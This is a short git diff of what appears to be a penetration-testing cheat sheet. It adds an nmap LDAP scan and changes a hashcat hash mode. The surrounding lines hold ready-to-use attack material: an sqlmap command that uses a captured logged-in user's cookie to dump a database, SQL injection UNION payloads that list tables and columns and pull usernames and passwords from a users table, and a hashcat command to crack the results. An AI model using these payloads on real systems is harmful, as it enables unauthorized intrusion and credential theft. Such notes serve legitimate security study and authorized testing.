@@ -58,6 +58,8 @@ nmap -p 389, 636, 88, 3268 subnet
 
 Get NetBIOS and FQDN:
 nmap -sC Ip --top-ports=20
+nmap -p389 -sV subnet/IP
+
 
 Find OpenSSH version:
 nmap -p 22 subnet --open -T5 -sV
@@ -209,7 +211,7 @@ $ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME
 •	?id=1' UNION SELECT null, table_name FROM information_schema.tables—
 •	?id=1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'—
 •	?id=1' UNION SELECT username, password FROM users WHERE username='Sarah'--
--hashcat -m 0 example500.hash /D/wordlists/user.txt
+-hashcat -m 500 example500.hash /D/wordlists/user.txt
 OR
 -/?id=4 UNION SELECT 1,2--
 -/?id=4 UNION SELECT null, table_name FROM information_schema.tables--
